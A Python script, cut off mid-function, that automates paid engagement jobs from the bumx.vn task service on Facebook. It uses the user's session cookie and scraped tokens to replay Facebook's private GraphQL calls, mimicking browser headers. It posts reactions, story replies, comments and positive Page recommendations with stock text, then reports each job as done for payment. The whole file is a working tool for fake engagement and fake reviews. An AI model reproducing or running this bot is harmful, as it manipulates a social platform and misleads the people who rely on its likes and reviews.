import base64
import hashlib
import json
import os
import platform
import random
import re
import string
import subprocess
import sys
import time
import urllib.parse
import uuid
from datetime import datetime, timedelta, timezone
from time import sleep
import threading

Check và cài đặt các thư viện cần thiết
try:
    from colorama import Fore, Style, init
    init(autoreset=True)
    import pytz
    import requests
except ImportError:
    print('__Đang cài đặt các thư viện cần thiết, vui lòng chờ...__')
    Sử dụng sys.executable để đảm bảo pip tương ứng với môi trường python hiện tại
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "colorama", "pytz"])
    Cài đặt thêm thư viện cho Telegram
    subprocess.check_call([sys.executable, "-m", "pip", "install", "python-telegram-bot"])
    print('__Cài đặt hoàn tất, vui lòng chạy lại Tool__')
    sys.exit()

CONFIGURATION
HANOI_TZ = pytz.timezone('Asia/Ho_Chi_Minh') Múi giờ Hà Nội

DEVICE ID FUNCTION
def get_device_id():
    """Generates a stable device ID based on CPU information."""
    system = platform.system()
    try:
        if system == "Windows":
            cpu_info = subprocess.check_output('wmic cpu get ProcessorId', shell=True, text=True, stderr=subprocess.DEVNULL)
            cpu_info = ''.join(line.strip() for line in cpu_info.splitlines() if line.strip() and "ProcessorId" not in line)
        else:
            try:
                cpu_info = subprocess.check_output("cat /proc/cpuinfo", shell=True, text=True)
            except:
                cpu_info = platform.processor()
        if not cpu_info:
            cpu_info = platform.processor()
    except Exception:
        cpu_info = "Unknown"

    hash_hex = hashlib.sha256(cpu_info.encode()).hexdigest()
    only_digits = re.sub(r'\D', '', hash_hex)
    if len(only_digits) < 16:
        only_digits = (only_digits * 3)[:16]

    return f"DEVICE-{only_digits[:16]}"

def clear_screen():
    os.system('cls' if platform.system() == "Windows" else 'clear')

def decode_base64(encoded_str):
    decoded_bytes = base64.b64decode(encoded_str)
    decoded_str = decoded_bytes.decode('utf-8')
    return decoded_str

def encode_to_base64(_data):
    byte_representation = _data.encode('utf-8')
    base64_bytes = base64.b64encode(byte_representation)
    base64_string = base64_bytes.decode('utf-8')
    return base64_string

def prints(*args, **kwargs):
    Default color: white
    r, g, b = 255, 255, 255
    text = "text"
    end = "\n"

    Argument handling
    if len(args) == 1:
        text = args[0]
    elif len(args) >= 3:
        r, g, b = args[0], args[1], args[2]
        if len(args) >= 4:
            text = args[3]
    if "text" in kwargs:
        text = kwargs["text"]
    if "end" in kwargs:
        end = kwargs["end"]

    print(f"\033[38;2;{r};{g};{b}m{text}\033[0m", end=end)

def facebook_info(cookie: str, timeout: int = 15):
    try:
        session = requests.Session()
        session_id = str(uuid.uuid4())
        fb_dtsg = ""
        jazoest = ""
        lsd = ""
        name = ""
        user_id = cookie.split("c_user=")[1].split(";")[0]

        headers = {
            "authority": "www.facebook.com",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image:apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-language": "vi",
            "sec-ch-prefers-color-scheme": "light",
            "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "none",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                          "AppleWebKit/537.36 (KHTML, like Gecko) "
                          "Chrome/106.0.0.0 Safari/537.36",
            "viewport-width": "1366",
            "Cookie": cookie
        }

        url = session.get(f"https://www.facebook.com/{user_id}", headers=headers, timeout=timeout).url
        response = session.get(url, headers=headers, timeout=timeout).text

        fb_token = re.findall(r'\["DTSGInitialData",\[\],\{"token":"(.*?)"\}', response)
        if fb_token:
            fb_dtsg = fb_token[0]

        jazo = re.findall(r'jazoest=(.*?)\"', response)
        if jazo:
            jazoest = jazo[0]

        lsd_match = re.findall(r'"LSD",\[\],\{"token":"(.*?)"\}', response)
        if lsd_match:
            lsd = lsd_match[0]

        get = session.get("https://www.facebook.com/me", headers=headers, timeout=timeout).url
        url = "https://www.facebook.com/" + get.split("%2F")[-2] + "/" if "next=" in get else get
        response = session.get(url, headers=headers, params={"locale": "vi_VN"}, timeout=timeout)

        data_split = response.text.split('"CurrentUserInitialData",[],{')
        json_data_raw = "{" + data_split[1].split("},")[0] + "}"
        parsed_data = json.loads(json_data_raw)

        user_id = parsed_data.get("USER_ID", "0")
        name = parsed_data.get("NAME", "")

        if user_id == "0" and name == "":
            print("[!] Cookie is invalid or expired.")
            return {'success': False}
        elif "828281030927956" in response.text:
            print("[!] Account is under a 956 checkpoint.")
            return {'success': False}
        elif "1501092823525282" in response.text:
            print("[!] Account is under a 282 checkpoint.")
            return {'success': False}
        elif "601051028565049" in response.text:
            print("[!] Account action is blocked (spam).")
            return {'success': False}

        json_data = {
            'success': True,
            'user_id': user_id,
            'fb_dtsg': fb_dtsg,
            'jazoest': jazoest,
            'lsd': lsd,
            'name': name,
            'session': session,
            'session_id': session_id,
            'cookie': cookie,
            'headers': headers
        }
        return json_data

    except Exception as e:
        print(f"[Facebook.info] Error: {e}")
        return {'success': False}

def get_post_id(session,cookie,link):
    prints(255,255,0,f'Đang lấy post id',end='\r')
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'dpr': '1',
        'priority': 'u=0, i',
        'sec-ch-prefers-color-scheme': 'light',
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'cookie': cookie,
    }
    try:
        response = session.get(link, headers=headers, timeout=15).text
        response= re.sub(r"\\", "", response)
        
        page_id=''
        post_id=''
        stories_id=''
        permalink_id=''
        try:
            if '"post_id":"' in str(response):
                permalink_id=re.findall('"post_id":".*?"',response)[0].split(':"')[1].split('"')[0]
                prints(255,255,0,f'permalink_id là: {permalink_id[:20]}      ',end='\r')
        except:
            pass
        try:
            if 'posts' in str(response):
                post_id=response.split('posts')[1].split('"')[0]
                post_id=post_id.replace("/", "")
                post_id = re.sub(r"\\", "", post_id)
                prints(255,255,0,f'Post id là: {post_id[:20]}       ',end='\r')
        except:
            pass
        try:
            if 'storiesTrayType' in response and not '"profile_type_name_for_content":"PAGE"' in response:
                stories_id=re.findall('"card_id":".*?"',response)[0].split('":"')[1].split('"')[0]
                prints(255,255,0,f'stories_id là: {stories_id[:20]}      ',end='\r')
        except:
            pass
        try:
            if '"page_id"' in response:
                page_id=re.findall('"page_id":".*?"',response)[0].split('id":"')[1].split('"')[0]
                prints(255,255,0,f'page_id là: {page_id[:20]}        ',end='\r')
        except:
            pass
        return {'success':True,'post_id':post_id,'permalink_id':permalink_id,'stories_id':stories_id,'page_id':page_id}
    except Exception as e:
        print(Fore.RED+f'Lỗi khi lấy ID post: {e}')
        return {'success':False}

def react_post_perm(data,object_id,type_react):
    prints(255,255,0,f'Đang thả {type_react} vào {object_id[:20]}       ',end='\r')

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'priority': 'u=1, i',
        'referer': 'https://www.facebook.com/'+str(object_id),
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-fb-friendly-name': 'CometUFIFeedbackReactMutation',
        'x-fb-lsd': data['lsd'],
        'cookie': data['cookie'],
    }
    react_list = {"LIKE": "1635855486666999","LOVE": "1678524932434102","CARE": "613557422527858","HAHA": "115940658764963","WOW": "478547315650144","SAD": "908563459236466","ANGRY": "444813342392137"}
    
    json_data = {
        'av': str(data['user_id']),
        '__user': str(data['user_id']),
        'fb_dtsg': data['fb_dtsg'],
        'jazoest': str(data['jazoest']),
        'lsd': str(data['lsd']),
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
        'variables': '{"input":{"attribution_id_v2":"CometSinglePostDialogRoot.react,comet.post.single_dialog,via_cold_start,'+str(int(time.time()*1000))+',893597,,,","feedback_id":"'+encode_to_base64(str('feedback:'+object_id))+'","feedback_reaction_id":"'+str(react_list.get(type_react.upper()))+'","feedback_source":"OBJECT","is_tracking_encrypted":true,"tracking":["AZWEqXNx7ELYfHNA7b4CrfdPexzmIf2rUloFtOZ9zOxrcEuXq9Nr8cAdc1kP5DWdKx-DdpkffT5hoGfKYfh0Jm8VlJztxP7elRZBQe5FqkP58YxifFUwdqGzQnJPfhGupHYBjoq5I5zRHXPrEeuJk6lZPblpsrYQTO1aDBDb8UcDpW8F82ROTRSaXpL-T0gnE3GyKCzqqN0x99CSBp1lCZQj8291oXhMoeESvV__sBVqPWiELtFIWvZFioWhqpoAe_Em15uPs4EZgWgQmQ-LfgOMAOUG0TOb6wDVO75_PyQ4b8uTdDWVSEbMPTCglXWn5PJzqqN4iQzyEKVe8sk708ldiDug7SlNS7Bx0LknC7p_ihIfVQqWLQpLYK6h4JWZle-ugySqzonCzb6ay09yrsvupxPUGp-EDKhjyEURONdtNuP-Fl3Oi1emIy61-rqISLQc-jp3vzvnIIk7r_oA1MKT065zyX-syapAs-4xnA_12Un5wQAgwu5sP9UmJ8ycf4h1xBPGDmC4ZkaMWR_moqpx1k2Wy4IbdcHNMvGbkkqu12sgHWWznxVfZnrzonXKLPBVW9Y3tlQImU9KBheHGL_ADG_8D_zj2S9JG2y7OnxiZNVAUb1yGrVVrJFnsWNPISRJJMZEKiYXgTaHVbZBX6CdCrA7gO25-fFBvVfxp2Do3M_YKDc5Ttq1BeiZgPCKogeTkSQt1B67Kq7FTpBYJ05uEWLpHpk1jYLH8ppQQpSEasmmKKYj9dg7PqbHPMUkeyBtL69_HkdxtVhDgkNzh1JerLPokIkdGkUv0RALcahWQK4nR8RRU2IAFMQEp-FsNk_VKs_mTnZQmlmSnzPDymkbGLc0S1hIlm9FdBTQ59--zU4cJdOGnECzfZq4B5YKxqxs0ijrcY6T-AOn4_UuwioY"],"session_id":"'+data['session_id']+'","actor_id":"'+str(data['user_id'])+'","client_mutation_id":"1"},"useDefaultActor":false,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":false}',
        'server_timestamps': 'true',
        'doc_id': '24034997962776771',
    }
    try:
        response = data['session'].post('https://www.facebook.com/api/graphql/', headers=headers, data=json_data, timeout=15).text
        return True
    except Exception:
        return False

def react_post_defaul(data,object_id,type_react):
    prints(255,255,0,f'Đang thả {type_react} vào {object_id[:20]}       ',end='\r')

    react_list = {"LIKE": "1635855486666999","LOVE": "1678524932434102","CARE": "613557422527858","HAHA": "115940658764963","WOW": "478547315650144","SAD": "908563459236466","ANGRY": "444813342392137"}
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'priority': 'u=1, i',
        'referer': 'https://www.facebook.com/'+str(object_id),
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-fb-friendly-name': 'CometUFIFeedbackReactMutation',
        'x-fb-lsd': data['lsd'],
        'cookie': data['cookie'],
    }
    
    json_data = {
        'av': str(data['user_id']),
        '__user': str(data['user_id']),
        'fb_dtsg': data['fb_dtsg'],
        'jazoest': data['jazoest'],
        'lsd': data['lsd'],
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'CometUFIFeedbackReactMutation',
        'variables': '{"input":{"attribution_id_v2":"CometSinglePostDialogRoot.react,comet.post.single_dialog,via_cold_start,'+str(int(time.time()*1000))+',912367,,,","feedback_id":"'+encode_to_base64(str('feedback:'+object_id))+'","feedback_reaction_id":"'+str(react_list.get(type_react.upper()))+'","feedback_source":"OBJECT","is_tracking_encrypted":true,"tracking":["AZWEqXNx7ELYfHNA7b4CrfdPexzmIf2rUloFtOZ9zOxrcEuXq9Nr8cAdc1kP5DWdKx-DdpkffT5hoGfKYfh0Jm8VlJztxP7elRZBQe5FqkP58YxifFUwdqGzQnJPfhGupHYBjoq5I5zRHXPrEeuJk6lZPblpsrYQTO1aDBDb8UcDpW8F82ROTRSaXpL-T0gnE3GyKCzqqN0x99CSBp1lCZQj8291oXhMoeESvV__sBVqPWiELtFIWvZFioWhqpoAe_Em15uPs4EZgWgQmQ-LfgOMAOUG0TOb6wDVO75_PyQ4b8uTdDWVSEbMPTCglXWn5PJzqqN4iQzyEKVe8sk708ldiDug7SlNS7Bx0LknC7p_ihIfVQqWLQpLYK6h4JWZle-ugySqzonCzb6ay09yrsvupxPUGp-EDKhjyEURONdtNuP-Fl3Oi1emIy61-rqISLQc-jp3vzvnIIk7r_oA1MKT065zyX-syapAs-4xnA_12Un5wQAgwu5sP9UmJ8ycf4h1xBPGDmC4ZkaMWR_moqpx1k2Wy4IbdcHNMvGbkkqu12sgHWWznxVfZnrzonXKLPBVW9Y3tlQImU9KBheHGL_ADG_8D_zj2S9JG2y7OnxiZNVAUb1yGrVVrJFnsWNPISRJJMZEKiYXgTaHVbZBX6CdCrA7gO25-fFBvVfxp2Do3M_YKDc5Ttq1BeiZgPCKogeTkSQt1B67Kq7FTpBYJ05uEWLpHpk1jYLH8ppQQpSEasmmKKYj9dg7PqbHPMUkeyBtL69_HkdxtVhDgkNzh1JerLPokIkdGkUv0RALcahWQK4nR8RRU2IAFMQEp-FsNk_VKs_mTnZQmlmSnzPDymkbGLc0S1hIlm9FdBTQ59--zU4cJdOGnECzfZq4B5YKxqxs0ijrcY6T-AOn4_UuwioY"],"session_id":"'+str(data['session_id'])+'","actor_id":"'+data['user_id']+'","client_mutation_id":"1"},"useDefaultActor":false,"__relay_internal__pv__CometUFIReactionsEnableShortNamerelayprovider":false}',
        'server_timestamps': 'true',
        'doc_id': '24034997962776771',
    }
    try:
        response = data['session'].post('https://www.facebook.com/api/graphql/', headers=headers, data=json_data, timeout=15)
        response.raise_for_status()
        return True
    except:
        return False

def react_stories(data,object_id):
    prints(255,255,0,f'Đang tim story {object_id[:20]}      ',end='\r')

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'priority': 'u=1, i',
        'referer': 'https://www.facebook.com/',
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-fb-friendly-name': 'useStoriesSendReplyMutation',
        'x-fb-lsd': data['lsd'],
        'cookie': data['cookie']
    }

    json_data = {
        'av': str(data['user_id']),
        '__user': str(data['user_id']),
        'fb_dtsg': data['fb_dtsg'],
        'jazoest': str(data['jazoest']),
        'lsd': data['lsd'],
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'useStoriesSendReplyMutation',
        'variables': '{"input":{"attribution_id_v2":"StoriesCometSuspenseRoot.react,comet.stories.viewer,via_cold_start,'+str(int(time.time()*1000))+',33592,,,","lightweight_reaction_actions":{"offsets":[0],"reaction":"❤️"},"message":"❤️","story_id":"'+str(object_id)+'","story_reply_type":"LIGHT_WEIGHT","actor_id":"'+str(data['user_id'])+'","client_mutation_id":"2"}}',
        'server_timestamps': 'true',
        'doc_id': '9697491553691692',
    }
    try:
        response = data['session'].post('https://www.facebook.com/api/graphql/',  headers=headers, data=json_data, timeout=15).json()
        if response.get('extensions', {}).get('is_final') == True:
            return True
        else:
            return False
    except Exception:
        return False

def react_post(data,link,type_react):
    res_object_id=get_post_id(data['session'],data['cookie'],link)
    if not res_object_id.get('success'):
        return False
        
    if res_object_id.get('stories_id'):
        return react_stories(data,res_object_id['stories_id'])
    elif res_object_id.get('permalink_id'):
        return react_post_perm(data,res_object_id['permalink_id'],type_react)
    elif res_object_id.get('post_id'):
        return react_post_defaul(data,res_object_id['post_id'],type_react)
    return False

def comment_fb(data,object_id,msg):
    prints(255,255,0,f'Đang comment vào {object_id[:20]}        ',end='\r')

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'priority': 'u=1, i',
        'referer': 'https://www.facebook.com/',
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-fb-friendly-name': 'useCometUFICreateCommentMutation',
        'x-fb-lsd': data['lsd'],
        'cookie': data['cookie'],
    }

    json_data = {
        'av': data['user_id'],
        '__user': str(data['user_id']),
        'fb_dtsg': data['fb_dtsg'],
        'jazoest': data['jazoest'],
        'lsd': data['lsd'],
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'useCometUFICreateCommentMutation',
        'variables': '{"feedLocation":"DEDICATED_COMMENTING_SURFACE","feedbackSource":110,"groupID":null,"input":{"client_mutation_id":"4","actor_id":"'+str(data['user_id'])+'","attachments":null,"feedback_id":"'+str(encode_to_base64('feedback:'+str(object_id)))+'","formatting_style":null,"message":{"ranges":[],"text":"'+msg+'"},"attribution_id_v2":"CometHomeRoot.react,comet.home,via_cold_start,'+str(int(time.time()*1000))+',521928,4748854339,,","is_tracking_encrypted":true,"tracking":["AZX3K9tlBCG5xFInZx-hvHkdaGUGeTF2WOy5smtuctk2uhOd_YMY0HaF_dyAE8WU5PjpyFvAAM8x4Va39jb7YmcxubK8j4k8_16X1jtlc_TqtbWFukq-FUR93cTOBLEldliV6RILPNqYHH_a88DnwflDtg8NvluALzkLO-h8N8cxTQoSUQDPh206jaottUIfOxdZheWcqroL_1IaoZq9QuhwAUY4qu551-q7loObYLWHMcqA7XZFpDm6SPQ8Ne86YC3-sDPo093bfUGHae70FqOts742gWgnFy_t4t7TgRTmv1zsx0CXPdEh-xUx3bXPC6NEutzyNyku7Kdqgg1qTSabLknlJ7KZ_u9brQtmzs7BE_x4HOEwSBuo07hcm-UdqjaujBd2cPwf-Via-oMAsCsTywY-riGnW49EJhhycbj4HvshcHRDqk4iUTO1ULV2CAOL7nGo5ACkUMoKbuWFl34uLoHhFJnpWaxPUef3ceL0ed19EChlYsnFl122VMJzRf6ymNtBQKbSfLkDF_1QYIofGvcRktaZOrrhnHdwihCPjBbHm17a3Cc3ax2KNJ6ViUjdj--KFE704jEjkJ9RXdZw3UIO-JjkvbCCeJ3Y-viGeank-vputYKtK1L05t2q5_6ool7PCIOufjNUrACbyeuOiLTyicyVvT013_jbYefPkhJ55PAtIqKn3JVbUpEWBYTWO8mkbU_UyjOnnhCZUagjWXYHKQ_Ne2gfLZN_WrpbEcLKdOtEm-l8J1RdnvYSTc13XVd85eL-k3da2OTamH7cJ_7bS6eJhQ0oSsrlGSJahq_JT9TV5IOffVeZWJ_SpcBwdPvzCRlMJIRljjSmgrCtfJrak8OgGtZM6jIZp6iZluUDlPEv1c_apazECx9CPC3pM1iu4QVdSdEzyBXbhul5hMDkSon4ahxJbWQ5ALpj-QAjfiCyz-aM0L5BqZLRugb_MdPk_ZWO3e70OX2LGHWKsd0ZGWP5kzpMqSMnkgTN5fGQ4A1QJ6EdEisqjclnSrD258ghVgKVEK9_PcIpGmmseB7fzrL1c5R65D4UZQq-kEpsuM42EhkAgfEEzrCTosmpRd7xibmd6aoVsOqCvJrvy_83bLE3-YTkhotHJeQxuLPWF1uvDSkhc_cs3ApJ1xFxHDZc5dikuMXne1azhKp5","{\\"assistant_caller\\":\\"comet_above_composer\\",\\"conversation_guide_session_id\\":\\"'+data['session_id']+'\\",\\"conversation_guide_shown\\":null}"],"feedback_source":"DEDICATED_COMMENTING_SURFACE","idempotence_token":"client:'+str(uuid.uuid4())+'","session_id":"'+data['session_id']+'"},"inviteShortLinkKey":null,"renderLocation":null,"scale":1,"useDefaultActor":false,"focusCommentID":null,"__relay_internal__pv__CometUFICommentAvatarStickerAnimatedImagerelayprovider":false,"__relay_internal__pv__IsWorkUserrelayprovider":false}',
        'server_timestamps': 'true',
        'doc_id': '9379407235517228',
    }
    try:
        response = data['session'].post('https://www.facebook.com/api/graphql/', headers=headers, data=json_data, timeout=15).json()
        comment_text = response['data']['comment_create']['feedback_comment_edge']['node']['preferred_body']['text']
        prints(5,255,0,f'Đã comment "{comment_text}"',end='\r')
        if comment_text == msg:
            return True
        return False
    except Exception as e:
        prints(255,0,0,f"Lỗi khi comment: {e}")
        return False

def dexuat_fb(data,object_id,msg):
    prints(255,255,0,f'Đang đề xuất Fanpage {object_id[:20]}        ',end='\r')
    if len(msg)<=25:
        msg+=' '*(26-len(msg))

    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://www.facebook.com',
        'priority': 'u=1, i',
        'referer': 'https://www.facebook.com/'+object_id,
        'sec-ch-ua': '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
        'x-fb-friendly-name': 'ComposerStoryCreateMutation',
        'x-fb-lsd': data['lsd'],
        'cookie': data['cookie']
    }

    json_data = {
        'av': str(data['user_id']),
        '__user': str(data['user_id']),
        'fb_dtsg': data['fb_dtsg'],
        'jazoest': data['jazoest'],
        'lsd': data['lsd'],
        'fb_api_caller_class': 'RelayModern',
        'fb_api_req_friendly_name': 'ComposerStoryCreateMutation',
        'variables': '{"input":{"composer_entry_point":"inline_composer","composer_source_surface":"page_recommendation_tab","idempotence_token":"'+str(uuid.uuid4()) + "_FEED"+'","source":"WWW","audience":{"privacy":{"allow":[],"base_state":"EVERYONE","deny":[],"tag_expansion_state":"UNSPECIFIED"}},"message":{"ranges":[],"text":"'+str(msg)+'"},"page_recommendation":{"page_id":"'+str(object_id)+'","rec_type":"POSITIVE"},"logging":{"composer_session_id":"'+data['session_id']+'"},"navigation_data":{"attribution_id_v2":"ProfileCometReviewsTabRoot.react,comet.profile.reviews,unexpected,'+str(int(time.time()*1000))+','+str(random.randint(111111,999999))+',250100865708545,,;ProfileCometTimelineListViewRoot.react,comet.profile.timeline.list,via_cold_start,'+str(int(time.time()*1000))+','+str(random.randint(111111,999999))+',250100865708545,,"},"tracking":[null],"event_share_metadata":{"surface":"newsfeed"},"actor_id":"'+str(data['user_id'])+'","client_mutation_id":"1"},"feedLocation":"PAGE_SURFACE_RECOMMENDATIONS","feedbackSource":0,"focusCommentID":null,"scale":1,"renderLocation":"timeline","useDefaultActor":false,"isTimeline":true,"isProfileReviews":true,"__relay_internal__pv__CometUFIShareActionMigrationrelayprovider":true,"__relay_internal__pv__FBReels_deprecate_short_form_video_context_gkrelayprovider":true,"__relay_internal__pv__StoriesArmadilloReplyEnabledrelayprovider":true,"__relay_internal__pv__FBReelsIFUTileContent_reelsIFUPlayOnHoverrelayprovider":true}',
        'server_timestamps': 'true',
        'doc_id': '24952395477729516',
    }
    try:
        response_json = data['session'].post('https://www.facebook.com/api/graphql/', headers=headers, data=json_data, timeout=15).json()
        
        post_id = response_json['data']['story_create']['profile_review_edge']['node']['post_id']
        my_id = response_json['data']['story_create']['profile_review_edge']['node']['feedback']['owning_profile']['id']
        link_post = f'https://www.facebook.com/{my_id}/posts/{post_id}'
        
        link_p=get_lin_share(data,link_post)
        return link_p
    except Exception as e:
        prints(5,255,0,f'Lỗi khi đánh giá Fanpage: {e}')
        return False

def wallet(authorization):
    headers = {
        'User-Agent': 'Dart/3.3 (dart:io)',
        'Content-Type': 'application/json',
        'lang': 'en',
        'version': '37',
        'origin': 'app',
        'authorization': authorization,
    }
    try:
        response = requests.get('https://api-v2.bumx.vn/api/business/wallet', headers=headers, timeout=10).json()
        return response.get('data', {}).get('balance', 'N/A')
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"
    except json.JSONDecodeError:
        return "Error decoding server response"

def load(session,authorization,job):
    prints(255,255,0,f'Đang mở nhiệm vụ...',end='\r')

    headers = {
        'User-Agent': 'Dart/3.3 (dart:io)',
        'Content-Type': 'application/json',
        'lang': 'en',
        'version': '37',
        'origin': 'app',
        'authorization': authorization,
    }

    json_data = {'buff_id': job['buff_id']}
    try:
        response = session.post('https://api-v2.bumx.vn/api/buff/load-mission', headers=headers, json=json_data, timeout=10).json()
        return response
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception:
        prints(255,0,0,f'Lỗi khi tải thông tin NV')
        return None

def get_job(session,authorization):
    prints(255,255,0,f'Đang lấy nhiệm vụ...',end='\r')
    headers = {
        'User-Agent': 'Dart/3.3 (dart:io)',
        'lang': 'en',
        'version': '37',
        'origin': 'app',
        'authorization': authorization,
    }
    params = {'is_from_mobile': 'true'}
    
    try:
        response = session.get('https://api-v2.bumx.vn/api/buff/mission', params=params, headers=headers, timeout=10)
        response.raise_for_status()
        response_json = response.json()
    except requests.exceptions.RequestException:
        prints(255,0,0,f'Lỗi khi lấy NV')
        return []
    except json.JSONDecodeError:
        prints(255,0,0,f'Lỗi giải mã JSON khi lấy NV.')
        return []

    prints(Fore.LIGHTWHITE_EX+f"Đã tìm thấy {response_json.get('count', 0)} NV",end='\r')
    
    JOB=[]
    for i in response_json.get('data', []):
        json_job={
            "_id":i['_id'],
            "buff_id":i['buff_id'],
            "type":i['type'],
            "name":i['name'],
            "status":i['status'],
            "object_id":i['object_id'],
            "business_id":i['business_id'],
            "mission_id":i['mission_id'],
            "create_date":i['create_date'],
            "note":i['note'],
            "require":i['require'],
        }
        JOB.insert(0,json_job)
    return JOB

def reload(session, authorization, type_job, retries=3):
    prints(255, 255, 0, f'Đang nhấn tải danh sách nhiệm vụ...', end='\r')
    if retries == 0:
        prints(255, 0, 0, 'Tải danh sách nhiệm vụ thất bại. Bỏ qua chu kỳ này.')
        return

    headers = {
        'User-Agent': 'Dart/3.3 (dart:io)',
        'Content-Type': 'application/json',
        'lang': 'en',
        'version': '37',
        'origin': 'app',
        'authorization': authorization,
    }
    json_data = {'type': type_job}
    try:
        response = session.post('https://api-v2.bumx.vn/api/buff/get-new-mission', headers=headers, json=json_data, timeout=10).json()
    except Exception:
        prints(255, 0, 0, f'Lỗi khi tải lại NV. Thử lại trong 2s...')
        time.sleep(2)
        return reload(session, authorization, type_job, retries - 1)

def submit(session,authorization,job,reslamjob,res_load):
    prints(255,255,0,f'Đang nhấn hoàn thành nhiệm vụ',end='\r')
    headers = {
        'User-Agent': 'Dart/3.3 (dart:io)',
        'Content-Type': 'application/json',
        'lang': 'en',
        'version': '37',
        'origin': 'app',
        'authorization': authorization,
    }
    json_data = {
        'buff_id': job['buff_id'],
        'comment': None, 'comment_id': None, 'code_submit': None,
        'attachments': [], 'link_share': '', 'code': '',
        'is_from_mobile': True, 'type': job['type'], 'sub_id': None, 'data': None,
    }

    if job['type']=='like_facebook':
        json_data['comment'] = 'tt nha'
    elif job['type']=='like_poster':
        json_data['comment'] = res_load.get('data')
        json_data['comment_id'] = res_load.get('comment_id')
    elif job['type']=='review_facebook':
        json_data['comment'] = 'Helo Bạn chúc Bạn sức khỏe '
        json_data['link_share'] = reslamjob
    
    try:
        response = session.post('https://api-v2.bumx.vn/api/buff/submit-mission', headers=headers, json=json_data, timeout=10).json()
        if response.get('success') == True:
            message = response.get('message', '')
            _xu = '0'
            sonvdalam = '0'
            try:
                _xu = message.split('cộng ')[1].split(',')[0]
                sonvdalam = message.split('làm: ')[1]
            except IndexError:
                pass
            return [True,_xu,sonvdalam]
        return [False,'0','0']
    except Exception:
        prints(255,0,0,f'Lỗi khi submit')
        return [False,'0','0']
    
def report(session, authorization, job, retries=3):
    prints(255, 255, 0, f'Đang báo lỗi...', end='\r')
    if retries == 0:
        prints(255, 0, 0, f'Báo lỗi thất bại sau nhiều lần thử. Bỏ qua chu kỳ này.')
        return

    headers = {
        'User-Agent': 'Dart/3.3 (dart:io)',
        'Content-Type': 'application/json',
        'lang': 'en',
        'version': '37',
        'origin': 'app',
        'authorization': authorization,
    }
    json_data = {'buff_id': job['buff_id']}
    try:
